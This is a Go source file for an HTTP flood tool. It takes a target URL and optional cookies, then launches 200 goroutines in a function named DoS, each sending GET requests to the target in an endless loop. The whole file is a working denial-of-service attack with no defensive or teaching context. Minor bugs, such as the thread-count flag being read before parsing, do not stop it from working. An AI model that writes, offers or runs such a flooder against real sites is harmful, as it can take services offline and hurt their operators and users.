package main

import (
	"flag"
	"log"
	"net/http"
	"net/url"
	"sync"
	"time"
)

func main() {
	threads := *flag.Int("threads", 200, "Number of threads (default 200)")
	var target string
	flag.StringVar(&target, "url", "", "Target URL")
	var cookie string
	flag.StringVar(&cookie, "cookie", "", "Cookies in the format key=value")

	flag.Parse()

	targetURL, err := url.Parse(target)
	if err != nil {
		log.Println(err.Error())
		return
	} else if !targetURL.IsAbs() {
		log.Println("An absolute must be provided!")
		return
	}

	var wg sync.WaitGroup
	wg.Add(threads)
	log.Printf("Sending HTTP requests to %s\n", targetURL.String())
	for i := 0; i < threads; i++ {
		go DoS(targetURL.String(), cookie)
	}
	wg.Wait()
}

func DoS(URL string, cookie string) {
	var netClient = &http.Client{
		Timeout: time.Second * 4,
	}
	req, _ := http.NewRequest("GET", URL, nil)
	if cookie != "" {
		req.Header.Set("Cookie", cookie)
	}

	for {
		netClient.Do(req)
	}
}
